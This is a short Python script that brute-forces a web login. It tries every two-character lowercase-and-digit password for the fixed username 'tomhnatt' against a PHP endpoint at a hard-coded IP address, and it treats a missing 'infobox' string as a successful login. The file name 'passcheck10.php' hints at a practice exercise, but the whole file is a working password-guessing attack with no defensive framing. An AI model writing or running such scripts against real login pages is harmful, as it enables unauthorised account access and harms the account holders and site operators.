import requests
import string

# Define the ASCII characters that we want to use
ascii_chars = string.ascii_lowercase + string.digits

# Set the URL of the login page and the username
url = "http://158.39.188.210/functions/passcheck10.php"
username = "tomhnatt"

# Loop through all possible combinations of characters for the password
for char1 in ascii_chars:
    for char2 in ascii_chars:
        # Construct the current password
        current_password = char1 + char2

        # Make a POST request to the login page with the current username and password
        response = requests.post(url, data={"username": username, "password": current_password})
        print(current_password)
        # Check if the response indicates a successful login
        if "infobox" not in response.text:
            #print(response.text)
            print(f"Found match! Username: {username}, Password: {current_password}")
            exit()

